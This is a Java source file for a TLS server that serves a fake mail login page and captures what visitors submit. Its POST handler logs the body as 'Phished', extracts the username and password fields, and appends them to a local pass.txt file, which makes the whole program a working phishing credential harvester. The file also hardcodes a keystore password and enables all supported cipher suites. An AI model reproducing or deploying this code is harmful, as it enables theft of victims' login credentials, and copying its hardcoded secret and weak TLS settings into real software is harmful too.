import java.io.*;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.security.KeyStore;
import javax.net.ssl.*;

public class Server2 {
	private int port = 9191;
	private boolean isServerDone = false;

	public static void main(String[] args) {
		Server2 server = new Server2();
		server.run();
	}

	Server2() {}

	private SSLContext createSSLContext() {
		try {
			KeyStore keyStore = KeyStore.getInstance("JKS");
			keyStore.load(new FileInputStream("newCerts/mykeystore.jks"), PASSWORD.toCharArray());

			// Create key manager
			KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance("SunX509");
			keyManagerFactory.init(keyStore, PASSWORD.toCharArray());
			KeyManager[] km = keyManagerFactory.getKeyManagers();

			// Create trust manager
			TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance("SunX509");
			trustManagerFactory.init(keyStore);
			TrustManager[] tm = trustManagerFactory.getTrustManagers();

			SSLContext sslContext = SSLContext.getInstance("TLS");
			sslContext.init(km, tm, null);

			return sslContext;
		} catch (Exception ex) {
//			ex.printStackTrace();
		}
		return null;
	}

	private void run() {
		SSLContext sslContext = this.createSSLContext();
		try {
			SSLServerSocketFactory sslServerSocketFactory = sslContext.getServerSocketFactory();
			SSLServerSocket sslServerSocket = (SSLServerSocket) sslServerSocketFactory.createServerSocket(this.port);

			System.out.println("SSL server started");
			while (!isServerDone) {
				SSLSocket sslSocket = (SSLSocket) sslServerSocket.accept();
				new ServerThread(sslSocket).start();
			}
		} catch (Exception ex) {
//			ex.printStackTrace();
		}
	}

	static class ServerThread extends Thread {
		private SSLSocket sslSocket;

		ServerThread(SSLSocket sslSocket) {
			this.sslSocket = sslSocket;
		}

		public void run() {
			sslSocket.setEnabledCipherSuites(sslSocket.getSupportedCipherSuites());
			try {
				sslSocket.startHandshake();
				BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(sslSocket.getInputStream()));
				PrintWriter printWriter = new PrintWriter(new OutputStreamWriter(sslSocket.getOutputStream()));

				String line;
				int contentLength = 0, c;
				while ((line = bufferedReader.readLine()) != null) {
					if (line.trim().isEmpty())
						break;

					if (line.equals("GET /mail HTTP/1.1")) {
						printWriter.println("HTTP/1.1 200 OK");
						printWriter.println("Content-Type: text/html");
						printWriter.println("\r\n");
						printWriter.println(readFile("mail/mail.htm"));
						printWriter.flush();
						printWriter.close();
					}

					else if(line.startsWith("POST")) {
						System.out.println("We have POST :D");
						while (!(line = bufferedReader.readLine()).equals("")) {
							final String contentHeader = "Content-Length: ";
							if (line.startsWith(contentHeader)) {
								contentLength = Integer.parseInt(line.substring(contentHeader.length()));
								System.out.println("POST length: " + contentLength);
							}
						}
						StringBuilder body = new StringBuilder();
						for (int i = 0; i < contentLength; i++) {
							c = bufferedReader.read();
							body.append((char) c);
						}
						String msg = body.toString();
						System.out.println("Phished: " + body);
						StringBuilder output = new StringBuilder();
						for(int i = msg.indexOf("username="); msg.charAt(i) != '&'; i++)
							output.append(msg.charAt(i));
						output.append(" => ");
						for(int i = msg.indexOf("password="); i < msg.length(); i++)
							output.append(msg.charAt(i));

						output.append("\n");
						System.out.println("Result: " + output.toString());

						try {
							Files.write(Paths.get("mail/pass.txt"), output.toString().getBytes(), StandardOpenOption.APPEND);
						} catch (IOException e) {
							e.printStackTrace();
						}

						printWriter.println("HTTP/1.1 200 OK");
						printWriter.println("Content-Type: text/html");
						printWriter.println("\r\n");
						printWriter.println(readFile("mail/mail.htm"));
						printWriter.flush();
						printWriter.close();
					}
				}
				printWriter.close();
				sslSocket.close();
			} catch (Exception ex) {
//				ex.printStackTrace();
			}
		}
	}


	static String readFile(String path) throws IOException {
		byte[] encoded = Files.readAllBytes(Paths.get(path));
		return new String(encoded, Charset.defaultCharset());
	}

	private String PASSWORD = "Dinozaur2004";
}